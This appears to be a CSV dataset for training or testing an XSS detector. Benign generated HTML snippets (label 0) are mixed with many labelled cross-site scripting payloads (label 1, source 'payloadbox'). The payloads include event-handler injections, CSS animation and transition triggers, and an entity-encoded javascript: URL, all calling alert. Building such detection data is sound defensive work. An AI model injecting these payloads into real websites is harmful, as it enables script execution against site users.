text,label,source,length,timestamp
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.414992
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.405991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.412991
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.407992
<svg><textarea onload=alert(1)></textarea>,1,payloadbox,42,2026-03-01T13:13:37.394683
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.410992
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,1,payloadbox,64,2026-03-01T13:13:37.395688
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",1,payloadbox,117,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403996
"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",1,payloadbox,61,2026-03-01T13:13:37.389686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.409991
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1,payloadbox,125,2026-03-01T13:13:37.396686
"<datalist onmouseup=""alert(1)"">test</datalist>",1,payloadbox,46,2026-03-01T13:13:37.387778
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,1,payloadbox,46,2026-03-01T13:13:37.393697
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",1,payloadbox,109,2026-03-01T13:13:37.387778
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",1,payloadbox,61,2026-03-01T13:13:37.389686
"<cite oncontextmenu=""alert(1)"">test</cite>",1,payloadbox,42,2026-03-01T13:13:37.386686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.396686
"<style>@keyframes slidein {}</style><time style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></time>",1,payloadbox,162,2026-03-01T13:13:37.393697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.400996
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",1,payloadbox,107,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403007
"<summary ondblclick=""alert(1)"">test</summary>",1,payloadbox,45,2026-03-01T13:13:37.393697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403996
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdo>",1,payloadbox,160,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
"<div id=""126""><object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object>",1,payloadbox,91,2026-03-01T13:13:37.396686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.409991
"<sub onkeypress=""alert(1)"" contenteditable>test</sub>",1,payloadbox,53,2026-03-01T13:13:37.393697
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationend=""alert(1)""></nav>",1,payloadbox,91,2026-03-01T13:13:37.393697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.399984
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",1,payloadbox,48,2026-03-01T13:13:37.388686
"<colgroup onmouseover=""alert(1)"">test</colgroup>",1,payloadbox,48,2026-03-01T13:13:37.386686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.408990
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,1,payloadbox,63,2026-03-01T13:13:37.387778
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
"<progress onkeyup=""alert(1)"" contenteditable>test</progress>",1,payloadbox,60,2026-03-01T13:13:37.391686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.399984
"<tbody draggable=""true"" ondrag=""alert(1)"">test</tbody>",1,payloadbox,54,2026-03-01T13:13:37.394683
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.409991
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
"<style>:target {color:red;}</style><iframe id=x style=""transition:color 1s"" ontransitionend=alert(1)></iframe>",1,payloadbox,110,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",1,payloadbox,180,2026-03-01T13:13:37.393697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.400996
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ol>",1,payloadbox,174,2026-03-01T13:13:37.393697
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",1,payloadbox,64,2026-03-01T13:13:37.389686
"<blockquote oncopy=""alert(1)"" contenteditable>test</blockquote>",1,payloadbox,63,2026-03-01T13:13:37.386686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<input type=image src=1 onerror=alert(1)>,1,payloadbox,41,2026-03-01T13:13:37.389686
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></li>",1,payloadbox,107,2026-03-01T13:13:37.392697
<span id=x tabindex=1 onfocusin=alert(1)></span>,1,payloadbox,48,2026-03-01T13:13:37.392697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
"<aside onmousemove=""alert(1)"">test</aside>",1,payloadbox,42,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",1,payloadbox,108,2026-03-01T13:13:37.392697
"<dir onbeforecopy=""alert(1)"" contenteditable>test</dir>",1,payloadbox,55,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<span class='class-2174'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.412991
<track id=x tabindex=1 onactivate=alert(1)></track>,1,payloadbox,51,2026-03-01T13:13:37.394683
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></slot>",1,payloadbox,178,2026-03-01T13:13:37.393697
"<marquee oncopy=""alert(1)"" contenteditable>test</marquee>",1,payloadbox,57,2026-03-01T13:13:37.390697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.407992
"<td onmousedown=""alert(1)"">test</td>",1,payloadbox,36,2026-03-01T13:13:37.394683
"<rt onmouseenter=""alert(1)"">test</rt>",1,payloadbox,37,2026-03-01T13:13:37.391686
"<output onmouseenter=""alert(1)"">test</output>",1,payloadbox,45,2026-03-01T13:13:37.390697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.412991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<span class='class-744'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.405991
"<h1 oncut=""alert(1)"" contenteditable>test</h1>",1,payloadbox,46,2026-03-01T13:13:37.388686
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1,payloadbox,91,2026-03-01T13:13:37.393697
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationend=""alert(1)""></dir>",1,payloadbox,91,2026-03-01T13:13:37.393697
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",1,payloadbox,99,2026-03-01T13:13:37.387778
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1,payloadbox,64,2026-03-01T13:13:37.391686
"<content onmouseenter=""alert(1)"">test</content>",1,payloadbox,47,2026-03-01T13:13:37.387778
"<listing oncopy=""alert(1)"" contenteditable>test</listing>",1,payloadbox,57,2026-03-01T13:13:37.389686
"<menuitem draggable=""true"" ondragleave=""alert(1)"">test</menuitem>",1,payloadbox,65,2026-03-01T13:13:37.390697
<input type=radio id=x onfocus=alert(1)>,1,payloadbox,40,2026-03-01T13:13:37.389686
"<u onbeforecut=""alert(1)"" contenteditable>test</u>",1,payloadbox,50,2026-03-01T13:13:37.395688
<span class='class-5044'>Services</span>,0,generated,40,2026-03-01T13:13:37.411988
<span class='class-2254'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.409991
<p>About</p>,0,generated,12,2026-03-01T13:13:37.398687
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.410992
"<blockquote onmouseout=""alert(1)"">test</blockquote>",1,payloadbox,51,2026-03-01T13:13:37.386686
<span class='class-974'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",1,payloadbox,59,2026-03-01T13:13:37.385678
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.410992
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.405009
"<tfoot onmouseenter=""alert(1)"">test</tfoot>",1,payloadbox,43,2026-03-01T13:13:37.394683
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.399984
"<button oncontextmenu=""alert(1)"">test</button>",1,payloadbox,46,2026-03-01T13:13:37.386686
"<noscript onclick=""alert(1)"">test</noscript>",1,payloadbox,44,2026-03-01T13:13:37.390697
"<select draggable=""true"" ondragstart=""alert(1)"">test</select>",1,payloadbox,61,2026-03-01T13:13:37.391686
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403007
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.400996
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,1,payloadbox,57,2026-03-01T13:13:37.385678
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
<span class='class-3204'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.396686
<span class='class-2354'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
<span class='class-5764'>Services</span>,0,generated,40,2026-03-01T13:13:37.413993
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.409991
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.414992
"<frame onmouseenter=""alert(1)"">test</frame>",1,payloadbox,43,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.408990
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.412991
"<optgroup onkeypress=""alert(1)"" contenteditable>test</optgroup>",1,payloadbox,63,2026-03-01T13:13:37.390697
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>,1,payloadbox,57,2026-03-01T13:13:37.394683
<source id=x tabindex=1 onfocusin=alert(1)></source>,1,payloadbox,52,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.408990
"<style>:target {color: red;}</style><optgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></optgroup>",1,payloadbox,119,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.399984
"<command draggable=""true"" ondragend=""alert(1)"">test</command>",1,payloadbox,61,2026-03-01T13:13:37.386686
"<script onbeforecut=""alert(1)"" contenteditable>test</script>",1,payloadbox,60,2026-03-01T13:13:37.391686
<svg><sup onload=alert(1)></sup>,1,payloadbox,32,2026-03-01T13:13:37.394683
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,1,payloadbox,53,2026-03-01T13:13:37.394683
"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",1,payloadbox,58,2026-03-01T13:13:37.394683
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.411988
"<link draggable=""true"" ondragstart=""alert(1)"">test</link>",1,payloadbox,57,2026-03-01T13:13:37.389686
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationstart=""alert(1)""></col>",1,payloadbox,93,2026-03-01T13:13:37.393697
"<select onpaste=""alert(1)"" contenteditable>test</select>",1,payloadbox,56,2026-03-01T13:13:37.391686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.389686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.412991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.397682
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.406989
"<div ondblclick=""alert(1)"">test</div>",1,payloadbox,37,2026-03-01T13:13:37.388686
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>,1,payloadbox,52,2026-03-01T13:13:37.386686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.411988
"'';!--""<XSS>=&{()}",1,payloadbox,18,2026-03-01T13:13:37.396686
<span class='class-2474'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
"<title onmouseup=""alert(1)"">test</title>",1,payloadbox,40,2026-03-01T13:13:37.394683
<span class='class-1914'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
<map id=x tabindex=1 onbeforeactivate=alert(1)></map>,1,payloadbox,53,2026-03-01T13:13:37.389686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
"<style>:target {transform: rotate(180deg);}</style><div id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></div>",1,payloadbox,124,2026-03-01T13:13:37.392697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<span class='class-2594'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.409991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405009
"<input onmousedown=""alert(1)"">test</input>",1,payloadbox,42,2026-03-01T13:13:37.389686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.412991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
"<map oncontextmenu=""alert(1)"">test</map>",1,payloadbox,40,2026-03-01T13:13:37.389686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.396686
"<tr draggable=""true"" ondragend=""alert(1)"">test</tr>",1,payloadbox,51,2026-03-01T13:13:37.394683
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.406989
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",1,payloadbox,110,2026-03-01T13:13:37.392697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.398687
<span class='class-3214'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */,1,payloadbox,63,2026-03-01T13:13:37.396686
"<input onclick=""alert(1)"">test</input>",1,payloadbox,38,2026-03-01T13:13:37.389686
<span class='class-4'>Services</span>,0,generated,37,2026-03-01T13:13:37.396686
<span class='class-3844'>Services</span>,0,generated,40,2026-03-01T13:13:37.407992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
"<h1 oncontextmenu=""alert(1)"">test</h1>",1,payloadbox,38,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.410992
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",1,payloadbox,101,2026-03-01T13:13:37.393697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.414992
<span class='class-5624'>Services</span>,0,generated,40,2026-03-01T13:13:37.413993
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.410992
"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",1,payloadbox,57,2026-03-01T13:13:37.389686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<param onmousemove=""alert(1)"">test</param>",1,payloadbox,42,2026-03-01T13:13:37.391686
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",1,payloadbox,55,2026-03-01T13:13:37.388686
"<strong onmousedown=""alert(1)"">test</strong>",1,payloadbox,44,2026-03-01T13:13:37.392697
"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",1,payloadbox,56,2026-03-01T13:13:37.390697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.400996
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.407992
<p>About</p>,0,generated,12,2026-03-01T13:13:37.397682
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,1,payloadbox,71,2026-03-01T13:13:37.386686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
<small id=x tabindex=1 onactivate=alert(1)></small>,1,payloadbox,51,2026-03-01T13:13:37.391686
"<ol onmousedown=""alert(1)"">test</ol>",1,payloadbox,36,2026-03-01T13:13:37.390697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.398687
"<q onmousemove=""alert(1)"">test</q>",1,payloadbox,34,2026-03-01T13:13:37.391686
"<bdi ondblclick=""alert(1)"">test</bdi>",1,payloadbox,37,2026-03-01T13:13:37.386686
